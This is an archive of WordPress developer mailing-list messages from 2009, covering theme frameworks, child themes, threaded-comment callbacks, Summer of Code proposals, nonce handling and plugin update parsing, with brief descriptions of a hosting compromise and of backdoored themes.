box, but it's a small settings panel instead).  This would probably  
work best with AJAX, so the user can open the pane, change settings  
and save them all without reloading the whole page.  AJAX would also  
eliminate the confusion of whether you're changing the setting for  
multiple plugins or just the one.

Personally, I would LOVE to see #2 implemented.  Again, this would  
only be for plugins that have minor one-time setup.  Anything that has  
settings that the admin is likely to go back to from time to time  
should have its own Settings page.

Not quite understanding.  Do you basically want a plugin that turns a  
WordPress site into something like Digg?

"Viper's Video Quicktags" plugin might be a good place to start.

Probably plugin territory.  This has been discussed recently. Check  
out "Role Manager".  It has been suggested that this plugin could use  
some support though, as the author hasn't had time to mess with it  
much lately.

I have a plugin that fixes this. It will make users from one blog be  
'promoted' to subscriber on the other.

I must be dumb, but I don't understand what a "theme framework" is.

Or, more precisely, what is it that "sandbox" or "default" themes are not?

Well,

The problem i reported was actually related to the hosting that was
attacked. I was beeing hosted on hostmonster (server 177 if i can
recall better) and it looks like it was an internal problem.

Since, i've bought myself a dedicated server and installed suhosin -
which broke things at the beginning - that was later instructed only
to alert on problems. I've since, created a cronjob to run every 2
hours that emails me the last ALERT issues from the messages
(/var/log/messages).

Again, i must say that if i've tought the hacking was done directly on
my website digging a little bit, i've found a script on hostmonster
that was actually looking for all index.php and index.html files and
depending on the extension of the file (.php or .html) was adding the
iframe target. The script was fully automated so, wherever it could
write it did. For some reason on hostmonster all the files could be
modified by the nobody user and so, i got hacked.

Anyways, reading about chmod (http://en.wikipedia.org/wiki/Chmod) and
WordPress permissions
(http://codex.wordpress.org/Changing_File_Permissions) lead me to the
chmoding of the files which were since NO longer hacked.

This is an isolated issue, and let me say it's only related to the
fact that you have (probably) some outdated plugins (which take use of
the 777 issue) and therefore you were hacked.

As always, backup early, restore if needed :)

madalin

An interface can have more than one categories. Is there feed with more than one categories already exists too? For example feed to posts in wordpress and programming categoies, http://sigit.web.ugm.ac.id/category/wordpress+programming/feed/ ?

Basic definition: http://codex.wordpress.org/Theme_Frameworks

In the past, you had to edit the .php and .css files directly with your
changes. If you ever decided to update the theme to a higher version, you
had to "keep track of your changes, remember about them, and reapply them
every time the theme is updated". (Reference: http://op111.net/53) By using
a theme framework and only modifying the child themes, the parent theme
remains untouched. A simple update of the parent theme would not break your
theme or site (or, depending on the level of modifications to the child
theme, would break it much, much less than in the past).

I think this has become increasingly important with the release of the theme
update API in 2.7, and will be even more so if automatic notification of
theme updates (as currently done for plugins) makes it into 2.8. (Reference:
http://core.trac.wordpress.org/ticket/7519)

"Sandbox" themes can be used as parent themes in a framework. But by
themselves out of the box, they aren't very useful or even desired by a
basic user. I'm hoping to create something that would become the "default"
theme for WordPress -- that could and would be used out of the box by basic
users, that could also easily be modified by intermediate users, and that
could be child theme modded into something crazy-fabulous by advanced users.

Plus -- and note, I am *entirely* speculating here about the
thoughts/motivations of the core devs in including this idea and might be
conflating them with my own thoughts -- WordPress official theme development
is seriously lagging behind that of many unofficial themes, and the official
theme is either quickly trashed or is being ignored by many non-basic users.
It would be nice if it would be used.

Oh, sweet Jebus, no. Rewriting the PHP files on the fly? I can just
imagine the incompatibility problems.

Look, we still have problems on a lot of hosts writing files for
plugin installation and for automated upgrades. If you start making it
actually create files as needed, you'll break it in tons of places.

So, until we can talk the-powers-that-commit into dropping PHP4, we're
probably stuck with this backwards type of solution.

Actually, the callbacks can be relatively simple. When I spent a month
upgrading all the wordpress.com themes, I did a lot of those
callbacks. Here's the basic methodology to it.

1. Determine the style of the comment. Hopefully, it's a UL-LI style.
Those are easiest. OL-LI is almost as simple, but it's best to do it
in UL mode instead. If you want numbering, you can add it via styles
anyway. A nested DIV mode is trickier, and anything else is probably
too difficult to mess with.

2. Create a function at the top of the comments.php file. I prefer to
put it here because it's slightly more efficient and it keeps the
comment function in a more obvious location. Make it look like this:

function themename_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);
?>
.. other stuff here...
<?php
}

3. That "other stuff" is basically going code to display one comment.
It'll look something like this (UL-LI case):

<li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
<div id="div-comment-<?php comment_ID() ?>">
	<div class="comment-meta">
		<div class="comment-author vcard">
		<?php if ($args['avatar_size'] != 0) { echo get_avatar( $comment,
$args['avatar_size'] ); } ?>
		<strong class="fn"><?php comment_author_link() ?></strong>, <?php
_e('on'); ?> <a href="#comment-<?php comment_ID() ?>" title=""><?php
comment_date('F jS, Y') ?> <?php _e('at');?> <?php comment_time()
?></a> <?php _e('Said&#58;'); ?> <?php edit_comment_link('Edit
Comment','',''); ?>
		</div>
		<?php if ($comment->comment_approved == '0') : ?>
		<em><?php _e('Your comment is awaiting moderation.'); ?></em>
		<?php endif; ?>
	</div>
	<?php comment_text() ?>
	<div class="reply">
		<?php comment_reply_link(array_merge( $args, array('add_below' =>
'div-comment', 'depth' => $depth, 'max_depth' => $args['max_depth'])))
?>
	</div>
</div>


Notice a few things about that code.
- It starts with an LI but does not close the LI. This is because the
LI is closed automatically, and threaded comments need to be inside
that LI.
- comment_class(). Use it. Love it.
- You need a DIV surrounding your comment, and it needs to have the ID
just like I used above. This is for the reply javascript to find your
comment to move the reply box to it.
- You can style the meta bits however you like, but if you're smart,
you'll put them in something with a class of "vcard". This makes them
an hCard microformat, as they output the necessary bits automatically
(get_avatar does, at least). Also include the comment_author_link in
an "fn" class to get this to work properly.
- The comment_reply_link needs a fair number of parameters. Just use
the ones I give you there. The "div-comment" in the add_below
parameter is what tells the javascript where to find your comment, in
order to move the comment box below it.

There's other bits as well. You still need to add the comment-reply
script into the header.php, and the comment form needs to be modified
slightly if you're doing a full conversion of an old theme to a new
one. If you need more customization, you can add an end_callback
function as well, to control the ending of the comment (stuff before
and including the closing LI). If you're doing a DIV style, you'll
need to add style=div into the wp_list_comments call as well. It can
be complex, but generally it's pretty straightforward once you get
used to it.

Message-ID: <501a5e00903281523h7fcbc63q38075e0703d5dba1@mail.gmail.com>

Hey everyone,
I'm Will, a graduate student from the University of Houston and I'm planning
on applying the GSoC this year.

I'm proposing to seamlessly integrate (seamlessly, as in, make the interface
pretty and subtle) metadata to the media library and pages systems. This
way, users can find all of the wordpress data via search instead of just
post-based information. With that said, I'd also like to create some
advanced search options for type filtering. For example, you could search
for the tag "apple" and find everything about apples. Perhaps you just want
to find images of apples, so we'll filter everything else out. Maybe images
and posts, but not video or sound. You get the idea.

Here's my full proposal:
http://holtkampw.com/2009/03/gsoc-2009-wordpress-application/
Password: gsoc2009

Any suggestions/ideas/thoughts/anything?

Thanks,
William Holtkamp

A particular plugin may want to modify the scripts before they get
output by the general hook, so the suffix first makes more sense.

Blogger has front-end editing? Last time I checked you go to a different
page when you edit it. My description was probably lacking. I meant a
front-end inline editing, where you have your post already there and just
want to drag or drop content boxes, resize them. And that you can edit the
content within each of them with just a double click or so and you just
start typing. Instead of going to a different page, you can edit the post on
the spot, assuming you have logged in and have permission.

Yea, kind of like that but I was wondering if there was something that's
inline with your post. Like if you are looking at a post (not in the admin
console panel) as an ordinary audience member and you notice that the title
is two lines because of 1 letter, you could double click on the title and
remove a letter or change the size of it and press "save" and magic things
happen that will make it saved.

I have seen themes from some sites (I won't mention any names here)
that definitely do have backdoors in them. In one case, the code was
in the clear, in another, it was in a obfuscated footer.php file.

In general, if a theme has any obfuscated code in it, then I'd say
it's untrustworthy.

Not exactly in that manner, but yes, any page that causes a main post

For something like that to work, you would need to have it built in with the
theme, or use a plugin that comes with it's own templating system, like
Flutter does.

The reason something like that can't currently be integrated into WordPress
is that WordPress themes are allowed complete freedom over the output, so
you don't have standard page elements like post_title, post_content, which
you could manipulate with javascript.

A theme framework that would offer inline editing would be reallly
interesting.

Actually, I think it would be easy to make this functionality available
through a plugin that would only require the CSS selectors, which can be set
up by either theme developers, or by the users themselves.

I've started work on such a plugin and hope to make it public soon.

If that would be possible, ISPs could detect online proxies too and block
them, which would defeat the purpose of online proxies in the first place.

Oh, I know. The files aren't created as needed, they're modified if  
they can be. That's all. Thing is, incompatibility problems are coming  
regardless, and without simply dropping PHP 4 support (which is the  
best solution), there will have to be a lot back-bending to get error  
suppression and conditional code in. This could just sit on top of  
that--it's not a solution, just an enhancement. It would be like Gears  
in the admin: something that can be used, but doesn't need to be.

Well

Having a JavaScript which looks for host name in users address bar and
if it is different redirect to the original website, well does that not
do the job?

If that would be possible, ISPs could detect online proxies too and
block
them, which would defeat the purpose of online proxies in the first
place.

Hello Every body...

I've written earlier more about this but i didn't get much comments yet..

You could retrieved the proposal from here
 http://kadirasays.co.cc/wordpress/?p=8

Basically this is doing is...

Create a gateway for communicate with wordpress...
If Other engines like Elgg and Joomla are inline with our gateway they can
communicate with us...

need comments...

Yeah, that could work. You could even do it in PHP, but remember that many
people use online proxies because that's the only way they can access your

This might be of interest to you:

It's a photo archive based on WordPress and uses Scriblio (a WP

It's far from perfect, but it does offer a current use case example,

I'm new to the list so I apologize off the bat if this has been  
suggested before.

It'd be great if there were an option to include child pages/posts of  
a password protected page. That way the user can protect a whole area  
with just the click of a mouse and the end-user only has to enter one  
password. I've seen a lot of requests for this sort of thing in the  
Forum's, with replies of "you should create a plugin for this."  
Which, is a great suggestion but not everyone that uses WP is capable  
of any kind of coding.

Surely if this feature is requested by so many people, at least one of them
will be savvy enough to write and release a plugin for it.

	Template Versioning
Message-ID: <66c9a2a70903292031m108e8531s936762faabfecc4c@mail.gmail.com>

Hi everyone,

I have 2 ideas I would like to discuss here
*
I) Open ID integration:*
I was thinking about why not integrate and adequately market Open ID (
http://openid.net/) into the Core Wordpress files. That way we don't have to
sign up for each of the wordpress blogs out there, and can instead use our
Open IDs! This would allow the OpenID login box to be automatically included
as part of the theme (currently it requires editing the theme files if you
don't want it under the comment box) as well as greatly expand the number of
blogs that support it. This is also a concern shared by 596 users on the
ideas page in wordpress (http://wordpress.org/extend/ideas/topic.php?id=40)

This I believe would make Wordpress more open and enhance the probability of
"talkback" for most blogs.

Some points to note from my research so far are

   1. There is an OpenID bounty program that pays out $5000 to any project
   that adds OpenID to their core. You'll notice they have WordPress listed as
   one of the projects they hope to take up the challenge.
   http://iwantmyopenid.org/bounty

   2. The issue that is raised by Matt Mullenweg on the wp-hackers list in
   Oct. 2005 <
   http://comox.textdrive.com/pipermail/wp-hackers/2005-October/002969.html>,
   is that

   '.. currently there exists lots of identification methods and none of
   them tend to be universally adopted. Moreover, the next reply tells a way to
   identificate other than just for blogs would be much more interesting, more
   'universal'. So, I doubt too OpenID would ever make in WP Core.is that there
   were competing identity standards.'

   But since then, of the 7 that he lists 5 (OpenID, Ping Identity, Identity
   Commons, Sxip and LID) have collapsed together into one and it's called
   OpenID. He suggests letting them duke it out and they have. Now we have
   OpenID. The other 2 he mentions are Yahoo (now BBAuth) and Passport. Those
   are both proprietary. Recently there is another competing ID mode -  a web
   Jabber identification (http://shearproject.info/jcas/), but I believe it
   has entered the market slightly later and hence is losing out to OpenID.
   Furthermore here is what jaykul says (
   http://wordpress.org/support/topic/70225?replies=7#post-492486) says

   "Regarding Jabber .... I know there's a web/jabber-id project, but I'd
   have to say that I don't think it's a good login identifier. The key to the
   OpenID system is that (similar to CardSpace -- they are essentially
   compatible) you get to choose which infromation you make available to sites
   that you log into using your ID. Some sites can *require* that you
   include certain pieces of information (like your email, or real name, or
   whatever) but you don't implicitly give them access to anything else. Doing
   the same thing with JabberIDs would require quite a bit of modification to
   the Jabber spec (currently your ID/vcard access is basically all or nothing)
   and would require web sites to implement a Jabber login themselves so the
   website could log into Jabber to check your ID in some way..."

   In summary at least, OpenID has emerged as the de facto, decentralized,
   open standard for identity and WordPress gets paid to add it to the core.

   3. Giving readers the ability to register an identity easily on any
   WordPress blog with one set of details, instead of having to create a new
   login and password for every blog. This would then mean that blog owners
   could turn off anonymous commenting, in turn cutting down somewhat on spam.
   But as Otto points out in the above mentioned thread (point no 2) "Most
   comment spam is done by automatic systems using the trackback functionality.
   Requiring users to register to comment just means that most users won't
   comment and reduce the number of real comments"  Although I agree with Otto
   partially, I think it is the number of real "not so serious comments" that
   are usually moderated out that are reduced which I believe is good.

   4. I think to an extent giving the users an option to use open id to
   register in wordpress as a whole might help bringing in more people to
   wordpress.

*II) Template versioning in Theme Editor:*
Also another idea that I am quite interested in is the versioning of  theme
editor template and style files. I believe several people edit (especially
when it is bulk) on other editors (like notepad++ etc) for the fact that the
theme editor lacks several attributes of WYSiWYG editor (changing that also
interests me especially since a lot of users find it troubling, but I think
it might take more time than what is allocated for GSoC). So the only thing
that benefits people is simple versioning of files and a nice interface to
manage those file versions that enables quick restoration of previous
versions coupled with ability to compare versions.

Summarizing here is what I think should be done

   1. Build a versioning system for template files within the theme editor.
   2. UI for showing different versions of a file (only the title like time
   modified etc)
   3. UI for comparing 2 versions of a file.

For the purpose of GSoC points 1 and 2 might be realistically achievable.

What are your thoughts on both of the above ideas, specifically on any
technical complexity or feasibility issue for either or rather simply if
they are good enough ideas or not?

Just a small addition to my previous post. For Open ID integration in the
points to note no 3, another reason why OpenID could benefit Wordpress is
that a quite a number of reputed blogs requires people to sign up or give
details like name/email address to comment anyway and an OpenID integration
can only make commenting easier in such cases.

Hey Edward..

I am a fellow GSoC aspirant and I really like your idea. If I am not wrong I
think it is a part of the puzzle that is User Permission/ Roles definitions.
I am not too sure if this is too much, but maybe you can consider other
processes like deleting a post/ re editing a post in the workflow to
complete it? That is in essence there are multiple roots (goals of a process
as per your definitions) each defined by the possible actions on the central
item you work on - post. You could also choose to have more central items
like blog design etc.

Regards
Vidyarth

Yeah.

And although i disabled it years ago, some leftovers of your plugin
still hang around in my blog nowadays :)
Waited a long time to say that!

Just kidding. =) Good work there!

Every implementation of interfaces for designing workflows i have seen
in big production systems where .. useless!
Think about it: You will design your workflow just once in two years
or so. And many things you can do informal between your staff.
So don't spend much time with the interface and more with the clean
implementation of the .. say .. end user appearance and security.

Well. Actually i just have some more use-cases, if you mind:

I need to oversee the work of 20 authors. I don't want to moderate
everything, but there is definitely the need to check images and
moderate these. (They never gonna realize what 'copyright' stands
for).

And then there are some posts that have to match certain criteria,
like a special meta-field set ... but that would be too much, hum?

kind regards .. and: go for it!
Jan


PS: How can one tell, if the designer designs and not alters what the
writer has written? =)

Subject: [wp-hackers] siteurl and home variables / constants
Message-ID: <49D082CD.9070100@yoast.com>

Hey,

I was looking at the code for site_url in 
/wp-includes/link-template.php, and saw that it /always/ does a 
get_option('siteurl'), even when, as on my site, WP_SITEURL is defined 
in wp-config.php. The same goes for get_bloginfo in 
/wp-includes/general-template.php, for both WP_SITEURL and WP_HOME.

Wouldn't it be good to check for that before doing the get_option, to 
save a query or two on each page load?

It would be quite easy to make those functions use check for the defined 
constants before doing a database call.

A quick plugin I cooked[1] up that does this by using the pre_option_* 
hook, showed me that this would save quite a number of calls (though of 
course after the two first calls, these would be cached). The only 
"issue" I encountered was that in functions.php's is_blog_installed 
function, a db query is done to check whether a blog is installed, and 
the query that's done is, you've guessed it, retrieving the siteurl...

Anyway, I think some performance improvement could be made by adding in 
a check for the defined constants, but maybe I'm missing something?

Best,
Joost


[1] The source for that plugin is very simple:

function checkwp_config_siteurl() {
     if ( defined( 'WP_SITEURL' ) ) {
         // error_log("Prevented get_option");
         return WP_SITEURL;
     }
     return false;
}
add_filter('pre_option_wpurl','checkwp_config_siteurl',10,1);

function checkwp_config_home() {
     if ( defined( 'WP_HOME' ) ) {
         // error_log("Prevented get_option");
         return WP_HOME;
     }
     return false;
}
add_filter('pre_option_url','checkwp_config_home',10,1);
add_filter('pre_option_siteurl','checkwp_config_home',10,1);
add_filter('pre_option_home','checkwp_config_home',10,1);

	editor interface
Message-ID: <728b820f0903300142t5ccb5f92k67932ab711aa945e@mail.gmail.com>

Dear respected WP hackers,

The deadline for GSoC application is coming soon, and I'm still crafting my
proposal. Below is a few simple notes of my proposal. I would like to have
your comments, suggestions and encouragement if you really like my idea.
Please don't hesitate to ask me for more details, or challenge my points or
point me to technical resources that can help me make this real! I do think
the title needs to be changed though (I'm not an English native speaker, so
please bear with my writing and grammar).

Thank you all in advance.

-------------------------------------------

Project Proposal rough draft:

Title: End user centered theme development framework

Purpose (in a sentence): To provide a unified theme framework, which allows
dynamic modification of the template based on user input from an easy to
understand GUI.

Current problem: How many times have you ever used the Appearance -> Editor
inside Wordpress Admin Panel? I guess only a handful out of thousands of WP
users end up using the built-in interface for theme modification. Most of
them resort to doing the dirty work themselves (fire up a PHP editor, dig
through thousands of lines of code, save the file and re-upload to the
server), a few of them would eventually outsource the task to someone else.

I know most of you guys are hackers, and editing a theme using a PHP editor
is a breeze to you. But most people who use WP are novice users (thanks to
the fact that WP is so user-friendly, and its support community is awesome).
Compared to other GUI awesomeness of Wordpress, the built-in theme editor
definitely falls short. So this explains the "end user centered" part of
this project title.

Solution:

I would like to propose two steps to address this problem:
- Creating a theme framework that provides a GUI for end user to
interactively modify the site's appearance, at the same time providing the
developers with an API that can enable their themes to adapt to various
scenarios of users' needs.
- Pray that one day WP would eventually embrace this to its core.

Example:
I'm in the process of drafting the GSoC Application. The deadline is coming
soon, and I'm trying to put together the comps for the interface. As a
result, please forgive me for temporarily using Squarespace's demo video to
illustrate the idea of this proposal. I'm in no way associated with
Squarespace (other than the fact that I just registered to receive a
two-week trial, so that I can gather more materials for my proposal). I
swear I love WP with all my heart! I do, that's why I'm writing this
proposal.

Please take a look at the video below to get an idea of what I'm about to
do:

http://cachefly.squarespace.com/assets/help-assets/help.style.flv

or

http://www.squarespace.com/tour/

Features
- Interactive ajax user-interface
  + Real-time preview
  + Color picker
- CSS templates
  + CSS variable parsing
  + Caching for performance
- Widgets Regions
  + Create an abstraction layer and interface for defining regions as well
as adding and positioning widgets within defined regions
  + Drag and drop
  + Widgets that can be used on multiple pages
  + Customization of widgets' output
- Export and Import
  + Enable the user to export or import customizations

I think you'd have to include a nonce with the email, but the point of
email is to be independent of time, so it's kind of contradictory.

I'm currently working on adding editing functionality to my TDO Mini
Forms plugin, should be available in a little while. It currently does
new posts via a form you can present in your theme. I had forgotten
about adding "editing in place", but it would be fairly easy to add
some JQuery javascript to your theme to display the edit form in place
of the content. I should add it to my todo list to have this as an
option. Its not exactly what you want, but it would be fairly close.

Here is a beta of the plugin. Please try it out!

Front End Editor 0.5b <http://scribu.net/files/front-end-editor.zip>

It works with post titles and post content, for now. To edit something,
double-click. It should work with any theme, out of the box.

Let me know what you think. (Please remember that this is just a beta,
though).

I do have a solution for that, but it will come at a cost.

A problem that I don't know how to solve yet is titles being used as
attributes in links.

Sounds like a good idea to me; performance issues aside, I'd think it  
ought to do that anyway. Isn't that the point of those constants?

Subject: [wp-hackers] Hiding Child's Template Theme
Message-ID: <49D0CD27.2000005@gaarai.com>

I'm starting to play around with child themes and wondered if it is 
possible to hide the parent or template theme of a child theme in Manage 
Themes.

Looking through the code, it looks like the only way to have a theme 
removed is if it is broken (missing parent theme, missing index.php or 
style.css, etc). Even then, it lists them as broken themes.

My reasoning for wanting to hide the parent theme is simple: I don't 
want a user to activate the parent theme if the child theme was the one 
customized or built for their needs. Looking at almost any information 
about building child themes has a note about not activating the parent 
instead of the child. So, I can't be the only one that sees the listing 
of parent themes problematic.

I'm thinking of building a patch for core that allows for an entry in 
the theme information that tells WordPress to hide the theme from 
activation on Manage Themes. For example:

    Theme Name: Parent Theme
    Theme URI: http://wordpress.org
    Author: Chris
    Author URI: http://site.com
    Version: 1.0
    Description: This is a parent theme and should not be used.
    *Hidden: yes*

Of course, a different option could be used instead of "Hidden:", and 
I'm open to suggestions.

I'm passing this by the list first to see 1) how many other developers 
are interested in my proposal and 2) if any other developers have any 
suggestions or recommendations.

Perhaps adding a filter in wp-admin/themes.php for $themes =
get_themes(); so that you can hook into it from the child themes
functions.php and remove the parent theme from the return.

Maybe:

$themes = apply_filters('get_themes', get_themes());

Then you could do:

add_filter('get_themes', 'remove_parent');
function remove_parent($themes) {
        return unset($themes['parent_name']);
}

A pretty good ideea, if I understood it well: If the theme has the "Hidden"
field and there is at least one child theme, then hide it from the Manage
Themes area.

Why not just set that user so he can't change themes?

If no built-in user works, you can use the Role manager plugin.

I have a patch in Trac that allows plugins to add a custom header to a  
plugin.  If this is committed, it makes sense to extend it to themes  
as well.

http://trac.wordpress.org/ticket/8964

If it were implemented for themes, it would be a step toward being  
able to do what you want via plugin.

Regards,
Stephen

I haven't thought of doing that Matt. I'll have to give it a try.

My initial thought is that doing this would break the theme since the 
location of the parent files will no longer exist in the data structure.

+1 on this.

If the constant is defined, it should be an absolute.  The constant  
should *always* override the value in the DB.

It shouldn't if the filter is added to wp-admin/themes.php because
that is used solely for displaying the themes on the manage themes
page.

Keep in mind that of course the filter is not already there and the
keys for the array returned by get_themes is actually the name of the
theme and not the slug.  For example 'WordPress Classic' instead of
'classic'

Set the filter so it only does its thing if we're on the Manage Themes  
page. :)

Matt,
I think Chris's point was that doing a filter there would be useful once the
theme is already activated. But that's exactly what we're trying to avoid.

The point is that we need a way making a theme hidden just by adding a
parameter to the style.css file.

Having to use the theme's code in order to hide the theme from the theme
list makes no sense.  It would never work.

My first thought is that this could work if there were themes that are
explicitly made to be used only as parent themes.

But if you use a theme like Sandbox or Thematic AND want to get
updates for it (which is the whole point of using a child theme) how
would you do it?

Maintain a parallel distribution?  Then the point of using a child
theme is defeated...

Am I missing something here?

Hi Sigit

I personally use Eclipse with PDT, but I am not sure what your actual
idea is but if you can do a plugin which can help people to get list of
actions/hooks and filter working with Intellisence would help a lot in
development of plugins.

Thanks

I have another idea for GSoC 2009 which is to develop Eclipse plugin to
help people create their own WordPress plugin. I'd like to know how many
PHP programer especially WordPress plugin developers who use Eclipse and
phpeclipse/pdt. Will this project be advantegous?

Why should e-mail be independent of time? The date header is mandatory for  
a reason. ;)

I have been playing around with Sandbox child themes over the last
month or so.  I really like the idea of child themes but there are a
couple of downsides which I have encountered:

1)  The parent theme must be installed.  Sounds trivial and for most
(all?) readers of this list that is obvious.  However, it isn't so
obvious for someone who just wants to download a theme and use it.
They actually need to download and install two themes in order to get
the child theme to work.  This is the main reason I am hopeful
WordPress will eventually include a theme framework in the standard
distribution.

2)  In 2.7.1 the Theme Preview displays the Parent theme instead of
the Child theme.  This can be confusing to the casual user as they
will go to activate the theme and it doesn't look anything like what
they expected, it looks like the parent which, if you use Sandbox,
doesn't look very interesting at all.

I am working on a new theme for  our Swim Team and I am taking a new
approach.  I am building it on Sandbox but instead of building it as a
child theme, I have set up the theme to include Sandbox as an SVN
external.

All of the files in the theme directory "require" the equivalent file
from the Sandbox external unless they are customized.  So far it is
working pretty well.  The upside to this method is I will only have to
distribute one theme and the preview works correctly.

This method would also prevent the use of the parent theme Chris Jean
was trying to accomplish in the original post.

So maybe check the nonce is within 24 hours, if it is then delete the
comment and if not, show the current screen?

IIRC, WordPress will only check for plugin updates every 12 hours.

I think the point to be made is that the nonce in the normal admin
screen is time sensitive, whereas clicking on a link in an email can
happen any (easily a long) time after it was generated and delivered.

Rich,

As a test I installed an old version of the plugin in question and
forced a check for updated versions by clearing the field from the
database.

UPDATE wp_options SET option_value='' WHERE option_name='update_plugins';

It does not show a new version although I see if in the plugin repository.

Looking at the code I noticed that the plugin has comments above the
standard plugin comments that wordpress.org uses to parse the plugin
data.  I noticed several weeks ago, which has been reported to Mark
Riley, that WordPress.org will not be able to parse the standard
plugin comments if there are other comments above it.

Not 100% sure that this is causing the problem but it very well may be.

I'm using Flutter for this: http://flutter.freshout.us/

Its still somewhere between alpha and beta, but so far its relatively  
stable. Edit in Place is only one of the hot tricks up its sleeve. It  
also includes Custom Write Panels, and some ajax-y layout management.  
Its got a ways to go, but if you don't mind your hands getting sticky  
in the codez, it might just work for you.

There is already a function that does exactly that on the option_siteurl filter. (_config_wp_siteurl 
to be exact).

That is to say, that get_option('siteurl') will _always_ return the value of the constant, if it is 
set.

It doesn't make a database call regardless, because those options are all prefetched and stored in 
memory anyway. wp_load_alloptions is only called once, and siteurl is autoloaded.... I fail to see 
how this would save "quite a number of calls".

was clicked after the nonce expired?

timezone>)

Granted it's not very pretty...

P.S. Hi, I'm new to this list. Developing a WP plugin for Xerox that I'm
not allowed to talk about, but I figured I would try to lend a hand to
the community since I'm already so engrossed in WP code on a daily
basis.

I think the point to be made is that the nonce in the normal admin
screen is time sensitive, whereas clicking on a link in an email can
happen any (easily a long) time after it was generated and delivered.

Currently the nonce creation in WordPress involves a user_id. As the
comment is created by either a guest or a non-admin user, it is
more then likely the user clicking on the spam-it link will be a
different user the nonce check will fail.
So for the purpose of this request a new nonce creation function and
check function will have to be implemented.

The standard nonce checks in WordPress will fail if nonce has been
created more as 24 hours ago.

Ah now I understand why I couldn't find it. It's indeed on 
option_siteurl, where it should be, IMHO, on pre_option_siteurl, that 
basically fixes the whole issue, if we also move the one from 
option_home to pre_option_home :)

Rich -

I'm looking at the wordpress.org page for the plugin you linked to. The 
current version is not listed in the blue box on the right (FYI). The 
top entry should be Version: 1.5.0

I downloaded the plugin and checked your readme.txt file - you've got 
the stable tag listed for the version number, so not sure why it isn't 
showing up.

Is it possible that this is causing the issue with the update notification?

Kim, my previous comment explains why the version number and such are
not being parsed from the main plugin file.

Actually working on a plugin now that works like this (more or less).  
However its tied up with users paying for different levels of access.  
Its for a client, so I'm not sure it will exactly make it out as a  
release, but we'll see.

I'd hardly say that. There are lots of providers, but hardly any  
consumers, except on early adopter focused web apps (i.e. Basecamp,  
and its ilk). Not to mention that you left out Facebook Connect and  
Google Friend Connect. Both competing standards (though Google does  
use Open ID in some layers of its Open Social stack). FB Connect has  
more users than Open ID  has and no confusing pattern for End Users to  
get accustomed to. Does this mean that FBConnect is a standard too,  
because there are 117 Million+ users? No it does not.

Don't get me wrong, I use OpenID, and I love it. But my mom won't be  
using it anytime soon, nor will the majority of blog commenters. There  
are plugins that address this already, so until Wordpress.com becomes  
an OpenID provider, I don't see WordPress supporting OpenID in core,  
especially while the fight over federated login/identity is still  
being waged.

WordPress.com is already an OpenID provider, and has been for quite
some time: http://en.blog.wordpress.com/2007/03/06/openid/

Message-ID: <a5a3520c0903301018l6d72e358sb9ec60642cae24bd@mail.gmail.com>

Hello fellow Wordpress developers, I am a student currently applying for the
GSoC program and I have some ideas for Wordpress I would like to double
check with everyone before I write up my proposal.

Well my idea is actually two different ideas but related to one another.
They are both based on the idea of theme frameworks that was discussed on
the GSoC ideas page. The idea is to have 'theme packages' that tie in a
theme with a set of related plugins.
Right now WP only provides installation/activation of one plugin at a time
and then the theme has to be optimized to take advantage of those plugins. I
propose to have one installer that can install/activate/deactivate one set
of plugins at a time, in combination with a relevant theme. For example, the
Buddypress package installs a set of plugins that are used with BuddyPress,
and the layout could be a facebook-type layout. I think this could greatly
benefit users who need to save time and are not going to mix and match
different plugins and layouts.

The second idea is to have a dynamic switchable theme by visitors. Right now
I have a primitive example on my site http://www.blue-kaos.com that changes
the theme every time the page reloads. Eventually I want to have it so that
vistors can change the theme of the site to customize its properties. If a
big MU site has lots of different functionality then the user can switch
between say 'wordpress-social networking mode' and 'wordpress-wiki mode',
etc. And/or change the template to suit themselves. But this will have to be
done client-side, so I think a bit of AJAX and JS-PHP interaction would have
to be done here.

What do you think? I could greatly appreciiate some support/criticism

And here comes the idea of dependency management for themes and plugins in
Core: WordPress should automatically display a message *This theme/plugin
needs "Parent Theme" to be installed. Would you like to install it now?
[Yes][No].*

This is certainly a bug and should be reported on trac, if it wasn't
reported already.

Hi Kim/Matt/et al,

Thanks for your responses - I've updated the plugin re Matt's 
suggestion, and it works as expected!  Woohoo!  I find it interesting 
that the comment format worked fine in older versions of WP, but 
recently it has stopped working.  Perhaps this explains the drop in 
downloads for the plugin... :)

The reason why I had initially put the GNU license info before the WP 
metadata was because the GNU license stipulates that it be placed at the 
top of every source file.  However, I don't think anyone can object to 
the exception if it is unavoidable due to a technical limitation such as 
this.

Anyway, thanks again for your help, and have a great day!

It is something that has recently started happening within about the
past month or so.  I have contacted those at Automattic in charge of
this functionality as of several weeks ago and followed up with them
again today.  Hopefully we should see a fix sometime soon.

That's a very good ideea, if you take it one step further: Each theme/plugin
could have a set of dependencies. The user should have an option to install
all dependencies automatically. Uses: child themes, child plugins, theme
packages (like you mentioned).

I don't see much use for that. Sure, a style/layout switcher can be cool for
some sites, but it's plugin-land.

Snap. I'm also working on something similar, although I think mine
will be released as I've managed to persuade the client of the virtue
of releasing work I do for them on WP Plugins. :) Not something that's
always possible with clients unfortunately.

Sure, dependencies would be nice. Do you have a good idea on how I could
implement or get started with a proposal like this? Help is appreciated.

OT: The reason I don't use complex plugins like Flutter or Pods is because
if the plugin is abandoned, your Flutter based site is screwed.

You could implement one or two functions, similar to
register_activation_hook(), which would be called like this:

register_theme_dependencies(array(
     'foo-plugin' => '1.0'
     'another_plugin' => '3.3'
);

register_plugin_dependencies(array(
     'foo-plugin' => '1.0'
     'another_plugin' => '3.3'
);

Basically, what those functions do is check all deps and add the plugins
that are not already installed to a donwload queue. After that, the user is
asked if he wants to install them.

This shouldn't be too hard because WP already has automatic plugin
installation.

Of course, the devil is in the details.

RE: OT Complex Plugins

I understood Flutter to simply use Custom Fields whereas PODS was using it's own prefixed DB tables. If this is the case, I'd think recovering from Flutter abandonment would me much easier.

Hey,

I've been playing with this plugin a bit, and submitted a patch to Frank 
who was kind enough to immediately commit it, based on my experiences 
I've written a post on it: 
http://yoast.com/wordpress-performance-optimization/

There's one paragraph in there that everyone should take note of about 
empty options, in short:

     doing a get_option to check whether a certain option is set or not, 
is actually more expensive,
     database wise, than just setting the option and leaving it empty, 
as it causes a query...

Might be good to know for the plugin authors out there!

Best,
Joost

Hi everyone! :)
I want to participate in GSoC but I think I don't have very cool idea.
My project is WordPress and bbPress integration is sense of comments and
posts (posts and topics in bbPress) integration.
Here the WordPress part:
